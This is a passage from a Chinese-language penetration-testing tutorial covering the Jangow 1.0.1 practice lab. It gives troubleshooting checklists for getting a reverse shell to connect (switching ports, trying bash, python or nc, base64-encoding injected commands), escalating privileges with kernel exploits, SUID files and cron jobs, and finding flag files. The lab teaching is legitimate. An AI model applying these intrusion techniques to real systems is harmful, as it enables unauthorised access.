   > 可以先把Kali的防火墙关了试试。

5. **换个端口？**
   > 4444端口不行，就换个端口试试，比如1234、8080、9999。
   >
   > 说不定端口被占用了，或者被防火墙挡了。

6. **换种反弹方式？**
   > bash反弹不行，就试试python反弹；python不行，就试试nc反弹。
   >
   > 多试几种，总有一个能成功。

7. **命令有没有URL编码？**
   > 如果是在URL里执行命令，特殊字符（比如&、>、空格这些）可能会出问题。
   >
   > 可以把命令base64编码一下再执行，这样更稳妥。

按照这个清单一条一条查，99%的问题都能解决。

### 27.10.2 提权失败怎么办？

提权失败也是常有的事。别灰心，多试几种方法。

1. **信息收集做全了吗？**
   > 是不是漏掉了什么？再仔细检查一遍。
   >
   > SUID文件看了吗？定时任务看了吗？配置文件都找了吗？

2. **内核漏洞对不对？**
   > 用的exp是对应这个内核版本的吗？别拿错exp了。
   >
   > 不同的内核版本，对应的exp不一样。

3. **exp有没有编译对？**
   > 是32位系统还是64位系统？编译的时候有没有搞错？
   >
   > 32位的exp在64位系统上跑不起来，反之亦然。

4. **有没有其他方法？**
   > 这条路走不通，就换一条路。不要死磕一个方法。
   >
   > 提权的方法多着呢，这个不行试那个。

5. **去网上看看Writeup？**
   > 实在卡住了，就去搜搜"Jangow 1.0.1 writeup"，看看别人是怎么提权的。
   >
   > 没关系的，新手嘛，很正常。看懂了，学会了，就是你的东西了。

### 27.10.3 找不到flag怎么办？

找不到flag？别着急，仔细找。

1. **常见位置都找了吗？**
   - /home/用户名/ 下面
   - /root/ 下面
   - 网站目录下
   - /tmp/ 目录下

2. **用find命令搜一下？**
   ```bash
   find / -name "*.txt" 2>/dev/null
   find / -name "*flag*" 2>/dev/null
   find / -name "*proof*" 2>/dev/null
   ```
   全局搜一下，总能找到的。

3. **有没有可能是隐藏文件？**
   > 看看有没有以.开头的文件，那是隐藏文件。
   >
   > 用 `ls -la` 才能看到隐藏文件。

4. **是不是权限不够？**
   > 有些文件普通用户读不了，得root才能读。
   >
   > 提到root之后再找，肯定能找到。
